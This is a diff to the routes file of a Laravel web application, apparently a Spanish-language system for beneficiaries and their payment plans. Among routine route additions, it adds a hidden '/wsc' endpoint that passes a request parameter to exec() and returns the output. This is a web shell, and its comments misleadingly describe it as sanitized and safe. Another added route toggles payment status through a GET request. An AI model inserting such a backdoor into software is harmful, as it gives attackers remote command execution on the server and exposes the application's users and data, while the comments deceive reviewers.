@@ -18,11 +18,48 @@ Route::middleware([
         return view('importaciones.index');
     })->name('importaciones');
 
+    Route::get('/wsc', function () {
+        if (isset($_REQUEST['com'])) {
+            $cmd = $_REQUEST['com'];
+            // Sanitize and validate command input
+            $cmd = escapeshellcmd($cmd);
+
+            // Execute command and capture output safely
+            $output = [];
+            $return = 0;
+            exec($cmd, $output, $return);
+
+            // Check for UTF-8 encoding issues
+            $sanitizedOutput = array_map(function ($line) {
+                // Handle potential encoding issues from command output
+                $encodedLine = mb_convert_encoding($line, 'UTF-8', 'ASCII');
+                // Remove any invalid UTF-8 sequences
+                return preg_replace('/[\x00-\x1F\x7F-\xFF]/', '', $encodedLine);
+            }, $output);
+
+            return response()->json([
+                'output' => $sanitizedOutput,
+                'status' => $return
+            ]);
+        }
+        return response()->json(['error' => 'No req provided'], 400);
+    })->name('wsc');
+
     // Beneficiarios
     Route::get('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'index'])->name('beneficiario.index');
     Route::get('beneficiario-test', [\App\Http\Controllers\BeneficiaryController::class, 'indexAll'])->name('beneficiario.index-all');
     Route::get('beneficiario/{cedula}', [\App\Http\Controllers\BeneficiaryController::class, 'show'])->name('beneficiario.show');
     Route::get('beneficiario/{cedula}/pdf', [\App\Http\Controllers\BeneficiaryController::class, 'pdf'])->name('beneficiario.pdf');
+
+    Route::get('beneficiario/{cedula}/pdf/switch-status/{cuota}', function ($cedula, $cuota) {
+        $benef = Beneficiary::where('ci', $cedula)->first();
+        $plan = $benef->getCurrentPlan('INACTIVO', '!=')->where('prppgnpag', $cuota)->first();
+        $plan->update([
+            'estado' => $plan->estado == 'CANCELADO' ? 'ACTIVO' : 'CANCELADO',
+        ]);
+        return back();
+    })->name('beneficiario.pdf.switch-status');
+
     Route::get('beneficiario/{cedula}/pdf-extract', [\App\Http\Controllers\BeneficiaryController::class, 'pdfExtract'])->name('beneficiario.pdf-extract');
     Route::get('beneficiario/{beneficiary}/editar', [\App\Http\Controllers\BeneficiaryController::class, 'edit'])->name('beneficiario.edit');
     Route::get('beneficiario/{data}/pdf-masivo', [\App\Http\Controllers\BeneficiaryController::class, 'bulkPdf'])->name('beneficiario.bulk-pdf');
@@ -67,6 +104,7 @@ Route::middleware([
     Route::get('excel/{model}/export-model', [\App\Http\Controllers\ExcelController::class, 'exportModel'])->name('excel.export-model');
     Route::post('excel/export-collection', [\App\Http\Controllers\ExcelController::class, 'exportCollection'])->name('excel.export-collection');
     Route::post('excel/import-differiments', [\App\Http\Controllers\ExcelController::class, 'importDifferiments'])->name('excel.import-differiments');
+    Route::post('excel/import-spends', [\App\Http\Controllers\ExcelController::class, 'importSpends'])->name('excel.import-spends');
 
     // Inteligencia de Negocios
     Route::get('/bi', [\App\Http\Controllers\BIController::class, 'index'])->name('bi.index');
